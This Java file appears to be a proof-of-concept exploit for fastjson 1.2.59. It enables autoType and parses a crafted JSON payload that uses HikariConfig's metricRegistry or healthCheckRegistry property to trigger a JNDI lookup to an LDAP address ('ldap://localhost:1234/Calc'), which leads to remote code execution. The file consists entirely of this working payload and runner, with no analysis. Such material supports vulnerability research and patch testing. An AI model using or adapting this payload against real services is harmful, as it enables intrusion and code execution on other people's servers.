package Poc;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.alibaba.fastjson.serializer.SerializeConfig;

/*
    需开启AutoTypeSupport
    <dependency>
        <groupId>com.zaxxer</groupId>
        <artifactId>HikariCP</artifactId>
        <version>3.3.1</version>
    </dependency>
*/
public class Poc_1_2_59 {
    public static void main(String[] args) throws Exception{
        // turn on autoTypeSupport
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);


        String payload = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:1234/Calc\"}";
//        String payload = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:1234/Calc\"}";
        JSON.parse(payload);
    }
}
